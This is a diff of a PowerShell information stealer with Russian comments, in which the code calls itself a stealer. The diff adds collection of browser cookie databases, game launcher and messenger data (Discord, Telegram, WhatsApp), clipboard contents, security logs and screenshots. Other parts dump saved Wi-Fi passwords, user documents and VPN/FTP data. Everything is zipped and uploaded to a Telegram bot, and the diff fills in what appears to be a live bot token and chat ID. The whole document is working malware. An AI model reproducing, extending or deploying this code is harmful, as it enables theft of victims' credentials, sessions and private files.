@@ -15,13 +15,14 @@ $messages = @{
     FailSend = "Не получилось отправить архив.";
     Finished = "Стиллер завершён.";
 }
-$BotToken = "<ВАШ_ТОКЕН>"
-$ChatID = "<ВАШ_CHAT_ID>"
+$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
+$ChatID = "1266539824"
 
 Add-Type -Assembly System.IO.Compression.FileSystem
 
 function WriteMsg($key) { Write-Host $messages[$key] }
 
+# Деление больших файлов
 function Split-File {
     param ([string]$FilePath, [int]$PartSizeMB = 49)
     $bufSize = 1MB
@@ -49,6 +50,7 @@ function Split-File {
     return $parts
 }
 
+# Отправка архива в Telegram
 function Send-ResultToTelegram {
     param (
         [string]$BotToken,
@@ -71,11 +73,13 @@ function Send-ResultToTelegram {
         $client = New-Object System.Net.Http.HttpClient
         $response = $client.PostAsync($url, $form).Result
         $statusCode = $response.StatusCode
+        $result = $response.Content.ReadAsStringAsync().Result
         $fileStream.Dispose(); $form.Dispose(); $client.Dispose()
         if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true } else { return $false }
     } catch { return $false }
 }
 
+# Сбор информации о системе (оптимизировано)
 function Get-SystemInfo {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
@@ -93,11 +97,11 @@ function Get-SystemInfo {
     $sysInfo | Out-File "$OutDirectory\computer_info.txt"
     Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
     try {
-        $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
+        $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
         $wifiData = foreach ($profile in $wifiProfiles) {
             try {
                 $profileData = (netsh wlan show profile name="$profile" key=clear)
-                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
+                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
                 if ($password) { [PSCustomObject]@{SSID=$profile; Password=$password} }
             } catch {}
         }
@@ -105,19 +109,88 @@ function Get-SystemInfo {
     } catch {}
 }
 
-function Gather-Files { 
+Add-Type -AssemblyName System.Data
+
+# Сбор cookies Chrome
+function Get-ChromiumCookies {
+    param([string]$BrowserPath, [string]$OutDir)
+    $cookieDb = "$BrowserPath\Local State"
+    if (Test-Path $cookieDb) {
+        try {
+            Copy-Item $cookieDb -Destination "$OutDir\cookies.db" -Force -ErrorAction Stop
+        } catch {}
+    }
+}
+
+# Сбор cookies Firefox
+function Get-FirefoxCookies {
+    param([string]$ProfilePath, [string]$OutDir)
+    $cookieDb = "$ProfilePath\cookies.sqlite"
+    if (Test-Path $cookieDb) {
+        try {
+            Copy-Item $cookieDb -Destination "$OutDir\cookies.sqlite" -Force -ErrorAction Stop
+        } catch {}
+    }
+}
+
+# Все cookies Chromium
+function Get-AllChromiumCookies {
+    param([string]$OutDir)
+    $browsers = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
+        "$env:LOCALAPPDATA\Opera\Opera Stable"
+    )
+    foreach ($browserPath in $browsers) {
+        if (Test-Path $browserPath) {
+            $browserName = Split-Path $browserPath -Leaf
+            $browserOutDir = "$OutDir\$browserName"
+            New-Item -Path $browserOutDir -ItemType Directory -Force | Out-Null
+            Get-ChromiumCookies -BrowserPath $browserPath -OutDir $browserOutDir
+        }
+    }
+}
+
+# Все cookies Firefox
+function Get-AllFirefoxCookies {
+    param([string]$OutDir)
+    $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
+    if (Test-Path $profilesIni) {
+        $profiles = Get-Content $profilesIni | Select-String "Path=" | ForEach-Object { $_.Line -replace ".*Path=", "" }
+        foreach ($profile in $profiles) {
+            $profilePath = "$env:APPDATA\Mozilla\Firefox\$profile"
+            if (Test-Path $profilePath) {
+                $profileOutDir = "$OutDir\Firefox_$profile"
+                New-Item -Path $profileOutDir -ItemType Directory -Force | Out-Null
+                Get-FirefoxCookies -ProfilePath $profilePath -OutDir $profileOutDir
+            }
+        }
+    }
+}
+
+# Общее для браузеров
+function Get-BrowserData {
+    param($OutDirectory)
+    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    Get-AllChromiumCookies -OutDir "$OutDirectory\Chromium"
+    Get-AllFirefoxCookies -OutDir "$OutDirectory\Firefox"
+}
+
+# Сбор файлов
+function Gather-Files {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
     foreach ($dir in $userDirs) {
         if (Test-Path $dir) {
             Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
-                Where-Object { 
-                    $_.Length -lt 20MB -and 
-                    $_.Attributes -notmatch "System" -and 
+                Where-Object {
+                    $_.Length -lt 20MB -and
+                    $_.Attributes -notmatch "System" -and
                     $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
                     $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
-                } | foreach {
+                } | ForEach-Object {
                 try {
                     Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction Stop
                 } catch {
@@ -128,6 +201,82 @@ function Gather-Files {
     }
 }
 
+# Сбор данных игровых клиентов
+function Get-GameLauncherData {
+    param($OutDirectory)
+    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    $gamePaths = @(
+        "$env:APPDATA\Steam",
+        "$env:LOCALAPPDATA\Epic Games",
+        "$env:APPDATA\GOG.com",
+        "$env:LOCALAPPDATA\DayZ"
+    )
+    foreach ($gamePath in $gamePaths) {
+        if (Test-Path $gamePath) {
+            $gameName = Split-Path $gamePath -Leaf
+            try {
+                Copy-Item $gamePath -Destination "$OutDirectory\$gameName" -Recurse -Force -ErrorAction Stop
+            } catch {
+                Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $gamePath : $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+# Сбор данных мессенджеров
+function Get-MessengerData {
+    param($OutDirectory)
+    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    $messengerPaths = @(
+        "$env:APPDATA\Discord",
+        "$env:LOCALAPPDATA\Telegram",
+        "$env:APPDATA\Skype",
+        "$env:APPDATA\WhatsApp",
+        "$env:LOCALAPPDATA\Viber"
+    )
+    foreach ($messengerPath in $messengerPaths) {
+        if (Test-Path $messengerPath) {
+            $messengerName = Split-Path $messengerPath -Leaf
+            try {
+                Copy-Item $messengerPath -Destination "$OutDirectory\$messengerName" -Recurse -Force -ErrorAction Stop
+            } catch {
+                Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $messengerPath : $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+# Скриншот экрана
+function Take-Screenshot {
+    param([string]$OutFile)
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+        $bitmap.Save($OutFile)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+    } catch {}
+}
+
+# Сбор активности пользователя
+function Get-UserActivity {
+    param($OutDirectory)
+    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    try {
+        $clipboard = Get-Clipboard -ErrorAction SilentlyContinue
+        if ($clipboard) {
+            $clipboard | Out-File "$OutDirectory\clipboard.txt"
+        }
+    } catch {}
+    try {
+        Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue | Export-Csv "$OutDirectory\security_events.csv"
+    } catch {}
+}
+
+# Сбор VPN/FTP данных
 function Get-VpnFtpData {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
@@ -175,20 +324,7 @@ function Get-VpnFtpData {
     }
 }
 
-function Take-Screenshot {
-    param($OutFile)
-    Add-Type -AssemblyName System.Windows.Forms
-    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
-    $graphics = [Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
-    $bitmap.Save($OutFile)
-    $graphics.Dispose()
-    $bitmap.Dispose()
-}
-
-# Здесь добавьте функции Get-BrowserData, Get-GameLauncherData, Get-MessengerData, Get-UserActivity из вашей версии!
-
+# Функция запуска со всеми параллельными задачами
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
@@ -196,19 +332,25 @@ function Start-Execution {
 
     $jobs = @()
     WriteMsg "SystemCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir
+    
     WriteMsg "BrowsersCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-BrowserData -OutDirectory "$dir\Browsers" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-BrowserData -OutDirectory "$dir\Browsers" } -ArgumentList $tempDir
+    
     WriteMsg "FilesCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Gather-Files -OutDirectory "$dir\Files" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Gather-Files -OutDirectory "$dir\Files" } -ArgumentList $tempDir
+    
     WriteMsg "GamingCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-GameLauncherData -OutDirectory "$dir\Gaming" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-GameLauncherData -OutDirectory "$dir\Gaming" } -ArgumentList $tempDir
+    
     WriteMsg "MessengersCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-MessengerData -OutDirectory "$dir\Messengers" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-MessengerData -OutDirectory "$dir\Messengers" } -ArgumentList $tempDir
+    
     WriteMsg "UserActivity"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-UserActivity -OutDirectory "$dir\Activity" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-UserActivity -OutDirectory "$dir\Activity" } -ArgumentList $tempDir
+    
     WriteMsg "NetworkCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir); Get-VpnFtpData -OutDirectory "$dir\Network" } -ArgumentList $tempDir
+    $jobs += Start-Job -ScriptBlock { param($dir); . ([ScriptBlock]::Create((Get-Content -Path "$PSScriptRoot\main.ps1" | Out-String))); Get-VpnFtpData -OutDirectory "$dir\Network" } -ArgumentList $tempDir
 
     $jobs | Wait-Job | Receive-Job | Out-Null
     $jobs | Remove-Job
@@ -227,7 +369,7 @@ function Start-Execution {
     )
 
     $maxTelegramMB = 49
-    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
+    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB, 2)
     WriteMsg "TelegramSend"
     if ($zipSizeMB -le $maxTelegramMB) {
         $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath "$tempDir\System\user_info.txt"
